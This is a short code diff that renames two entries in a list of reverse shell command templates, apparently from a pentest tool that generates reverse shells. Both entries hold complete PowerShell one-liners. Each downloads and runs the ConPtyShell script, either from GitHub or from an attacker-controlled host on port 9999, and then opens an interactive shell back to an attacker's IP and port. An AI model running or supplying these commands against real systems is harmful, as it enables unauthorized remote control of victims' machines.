@@ -206,12 +206,12 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "windows", "mac"]
         },
         {
-            "name": "Windows ConPty",
+            "name": "Windows ConPty (Online)",
             "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
             "meta": ["windows"]
         },
         {
-            "name": "Windows ConPty Serve on port 9999",
+            "name": "Windows ConPty (Serve Locally on port 9999)",
             "command": "IEX(IWR http://{ip}:9999/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
             "meta": ["windows"]
         },
